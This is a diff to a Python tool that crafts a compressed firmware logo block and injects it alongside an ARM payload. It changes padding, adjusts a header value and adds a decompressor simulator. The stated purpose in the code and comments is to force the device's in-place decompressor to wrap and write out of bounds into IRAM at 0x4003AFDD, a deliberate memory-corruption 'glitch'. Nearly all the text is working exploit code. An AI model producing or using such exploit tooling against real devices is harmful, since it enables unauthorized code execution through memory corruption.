@@ -311,8 +311,12 @@ def compress(data: bytes) -> bytes:
 
     stream = _build_stream(ops)
     if len(stream) < SAFE_STREAM_LEN:
-        i = len(ops) - 1
-        while len(stream) < SAFE_STREAM_LEN and i >= 0:
+        # Pad by splitting HIGH-position ops (i=0 = near pos=n-1), not low-position ops.
+        # Splitting near pos=0 (stream[0:340]) corrupts the ml=36 back-refs that drive
+        # the in-place wrap at r2=1 → wrong IRAM write → ARM check fails → ===.
+        # High-pos ops are processed first (large r2), so in-place collision never occurs.
+        i = 0
+        while len(stream) < SAFE_STREAM_LEN and i < len(ops):
             flag, data_bytes, op_pos, op_len = ops[i]
             if flag == 1 and op_len > 6:
                 split       = _split_to_b6(data, op_pos, op_len)
@@ -321,7 +325,8 @@ def compress(data: bytes) -> bytes:
                 if len(new_stream) <= MAX_STREAM_LEN:
                     ops    = candidate
                     stream = new_stream
-            i -= 1
+                    continue  # re-check same index (now points to first split op)
+            i += 1
 
     comp_data = bytes(stream)
     comp_size = len(comp_data)
@@ -335,58 +340,118 @@ def compress(data: bytes) -> bytes:
 
     # Layout: zeros + stream + 4 trailing 0xFF bytes, matching original firmware.
     # stream at [stream_start..2495], zeros at [0..stream_start-1], 0xFF at [2496..2499].
-    # Rehius has 0xFF at positions 2496..2499 (its stream extends there); ARM checks for
-    # this pattern before decompressing. 0x00 here causes silent ARM payload failure (===).
     leading_zeros = STREAM_TOP - comp_size                  # = 2496 - comp_size
-    trailing_zeros = COMP_DATA_LEN - STREAM_TOP             # = 4  (positions 2496..2499)
+    trailing_zeros = COMP_DATA_LEN - STREAM_TOP             # = 4
     padded = b"\x00" * leading_zeros + comp_data + b"\xFF" * trailing_zeros
-
-    # Fix: inject rehius-compatible background encoding at stream[0:340].
-    #
-    # The ARM payload at 0x088A reads IRAM ~0x4003AFDD and checks it != 0.
-    # That address only gets written (with 0xF8) when the in-place decompressor's
-    # first wrap fires at write_start=-35, i.e. r2=1 before the wrap-triggering
-    # back-ref. Rehius achieves r2=1; our padding loop splits ml=36 ops into ml=6,
-    # causing in-place corruption that moves the wrap to r2=8 (write_start=-28),
-    # missing address 0x4003AFDD → ARM check fails → no success signal → ===.
-    #
-    # These 340 bytes encode ~5760 all-background (0xF8) pixels using ml=36
-    # back-refs — decompressed output identical to our logo at those positions.
-    # Replacing stream[0:340] with this patch forces the wrap at r2=1.
-    _REHIUS_BG_PATCH = bytes.fromhex(
-        "f80021f021f021f021f021f021f021f021f0ff21"
-        "f021f021f021f021f021f021f021f0ff21f021f0"
-        "21f021f021f021f021f021f0ff21f021f021f021"
-        "f021f021f021f021f0ff21f021f021f021f021f0"
-        "21f021f021f0ff21f021f021f021f021f021f021"
-        "f021f0ff21f021f021f021f021f021f021f021f0"
-        "ff21f021f021f021f021f021f021f021f0ff21f0"
-        "21f021f021f021f021f021f021f0ff21f021f021"
-        "f021f021f021f021f021f0ff21f021f021f021f0"
-        "21f021f021f021f0ff21f021f021f021f021f021"
-        "f021f021f0ff21f021f021f021f021f021f021f0"
-        "21f0ff21f021f021f021f021f021f021f021f0ff"
-        "21f021f021f021f021f021f021f021f0ff21f021"
-        "f021f021f021f021f021f021f0ff21f021f021f0"
-        "21f021f021f021f021f0ff21f021f021f021f021"
-        "f021f021f021f0ff21f021f021f021f021f021f0"
-        "21f021f0ff21f021f021f021f021f021f021f031"
-    )
-    _patch_len = len(_REHIUS_BG_PATCH)  # 340
-    if len(padded) >= leading_zeros + _patch_len:
-        padded = (padded[:leading_zeros]
-                  + _REHIUS_BG_PATCH
-                  + padded[leading_zeros + _patch_len:])
 
     # t0=2512, t1=16 → r3=(2512-16)-1=2495 (last byte of stream), t2=17968 → r2=20480
     t0 = LOGO_BLOCK_LEN   # 2512
     t1 = 16               # original firmware value; r3=2495 (stream ends at buf[2495])
-    t2 = BUF_LEN - LOGO_BLOCK_LEN   # 17968
+    t2 = BUF_LEN - LOGO_BLOCK_LEN + 3   # 17971: shifts r2_start so wrap fires at r2=1/ws=-35
     tail = struct.pack("<III", t0, t1, t2)
 
     block = padded + tail
     assert len(block) == LOGO_BLOCK_LEN
     return block, comp_size
+
+
+# ---------------------------------------------------------------------------
+# True in-place ARM decompressor simulation
+# ---------------------------------------------------------------------------
+
+def simulate_inplace(block: bytes) -> dict:
+    """
+    Simulate the ARM in-place decompressor on a 2512-byte logo block.
+    Uses a single buffer (like the ARM hardware), allows write_start < 0,
+    and tracks whether IRAM[0x4003AFDD] (offset -35 from out_buf) is written
+    with a non-zero value by the first wrap.
+
+    Returns a dict with:
+      wrap_r2      : r2 value when first wrap fires (None if no wrap)
+      write_start  : write_start of the wrap back-ref (None if no wrap)
+      iram_hit     : True if offset -35 was written with non-zero value
+    """
+    t0, t1, t2 = struct.unpack("<III", block[LOGO_BLOCK_LEN - 12:])
+    # Single buffer including leading zeros + stream + trailing 0xFF (2500 bytes).
+    out_buf = bytearray(block[:COMP_DATA_LEN])
+
+    r3 = (t0 - t1) - 1   # 2495 = last stream byte index
+    r2 = t0 + t2           # 20480 = initial write position
+    r5 = 8
+    r1 = out_buf[r3] if 0 <= r3 < COMP_DATA_LEN else 0
+
+    result = dict(wrap_r2=None, write_start=None, iram_hit=False)
+
+    # Mirror the ARM loop: runs while r2 > 0.
+    # The ARM exits at write_start == 0 (r0=1, success) or r3 underflow (r0=0).
+    # We also continue past write_start < 0 to simulate the wrap and IRAM writes.
+    wrapped = False
+
+    while r2 > 0:
+        flag = (r1 >> 7) & 1
+
+        if flag == 0:
+            # Literal
+            if r3 <= 0:
+                break
+            r3 -= 1
+            literal = out_buf[r3] if 0 <= r3 < COMP_DATA_LEN else 0
+            r2 -= 1
+            if 0 <= r2 < COMP_DATA_LEN:
+                out_buf[r2] = literal
+        else:
+            # Back-reference
+            if r3 < 2:
+                break
+            b_hi = out_buf[r3 - 1] if r3 - 1 < COMP_DATA_LEN else 0
+            b_lo = out_buf[r3 - 2] if r3 - 2 < COMP_DATA_LEN else 0
+            r3 -= 2
+            val16     = b_lo | (b_hi << 8)
+            match_len = ((val16 >> 11) + 6) & 0xFE
+            offset    = (val16 & 0xFFF) + 3
+            write_start = r2 - match_len
+
+            if write_start == 0:
+                # ARM normal-success exit (r0=1) — no IRAM write
+                break
+
+            if write_start < 0:
+                if not wrapped:
+                    wrapped = True
+                    result["wrap_r2"]    = r2
+                    result["write_start"] = write_start
+                    # Check whether offset -35 (= IRAM 0x4003AFDD) is covered
+                    # and what pixel value lands there.
+                    for i in range(match_len):
+                        dst = write_start + i
+                        src = write_start + offset + i
+                        pix = out_buf[src] if 0 <= src < COMP_DATA_LEN else BG
+                        if dst == -35:
+                            result["iram_hit"] = (pix != 0)
+                        if 0 <= dst < COMP_DATA_LEN:
+                            out_buf[dst] = pix
+                # After first wrap: r2 wraps to a huge uint32 value.
+                # Subsequent writes go to IRAM addresses we don't track further.
+                # The ARM eventually exits via r3 underflow (r0=0). Stop here.
+                break
+            else:
+                for i in range(match_len):
+                    src = write_start + offset + i
+                    pix = out_buf[src] if 0 <= src < COMP_DATA_LEN else BG
+                    if 0 <= write_start + i < COMP_DATA_LEN:
+                        out_buf[write_start + i] = pix
+                r2 = write_start
+
+        r1 = (r1 << 1) & 0xFF
+        r5 -= 1
+        if r5 == 0:
+            r3 -= 1
+            if r3 < 0:
+                break
+            r1 = out_buf[r3] if 0 <= r3 < COMP_DATA_LEN else 0
+            r5 = 8
+
+    return result
 
 
 # ---------------------------------------------------------------------------
@@ -559,6 +624,18 @@ def cmd_inject(args):
     print(f"  Backup saved: {bak_path}")
 
     # Patch
+    # Verify in-place wrap fires at r2=1 before patching
+    sim = simulate_inplace(block)
+    if sim["wrap_r2"] is None:
+        print("  WARNING: in-place sim — no wrap detected (decompressor exited normally)")
+    else:
+        ws  = sim["write_start"]
+        r2v = sim["wrap_r2"]
+        hit = "OK" if sim["iram_hit"] else "FAIL: IRAM[0x4003AFDD] NOT written"
+        print(f"  In-place sim: WRAP r2={r2v} ws={ws}  {hit}")
+        if r2v != 1 or ws != -35:
+            print("  WARNING: wrap not at r2=1/ws=-35 — glitch may fail")
+
     print(f"Patching {payload_path} ...")
     payload_bytes = load_payload(payload_path)
     patch_payload_h(payload_path, block)
